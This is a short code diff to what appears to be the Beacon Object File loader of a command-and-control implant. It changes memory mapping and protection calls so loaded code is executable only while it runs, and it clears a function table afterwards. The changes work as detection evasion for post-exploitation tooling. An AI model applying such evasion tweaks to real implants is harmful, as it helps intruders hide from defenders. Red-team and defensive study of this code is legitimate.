@@ -465,7 +465,9 @@ static char * bof_alloc(SIZE_T total, int * how) {
 		char * p;
 		if (map == NULL)
 			return NULL;
-		p = (char *)MapViewOfFile(map, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0, 0, total);
+		/* map RW-only: the view becomes executable via finalize_memory_permissions
+		 * before the BOF runs - no need to hold FILE_MAP_EXECUTE (RWX) up front */
+		p = (char *)MapViewOfFile(map, FILE_MAP_ALL_ACCESS, 0, 0, total);
 		CloseHandle(map);
 		return p;
 	}
@@ -544,8 +546,12 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 	}
 
 	if (setting_short(SETTING_BOF_REUSE_MEMORY) && bof_cached != NULL && bof_cached_size >= total) {
+		DWORD oldrw = 0;
 		base = bof_cached;
 		how = bof_cached_how;
+		/* the block idles RW after each run (see the tail of this function);
+		 * re-assert RW in case a previous finalize left it RX */
+		VirtualProtect(base, bof_cached_size, PAGE_READWRITE, &oldrw);
 		memset(base, 0, total);
 	}
 	else {
@@ -706,6 +712,13 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 			bof_cached_size = 0;
 		}
 	}
+	else {
+		/* cached-for-reuse block idles as RW (de-executed): executable only
+		 * while a BOF actually runs, writable again for the next load */
+		DWORD oldw = 0;
+		VirtualProtect(base, total, PAGE_READWRITE, &oldw);
+	}
+	memset(ftable, 0, sizeof(*ftable));
 	free(ftable);
 	return success;
 }
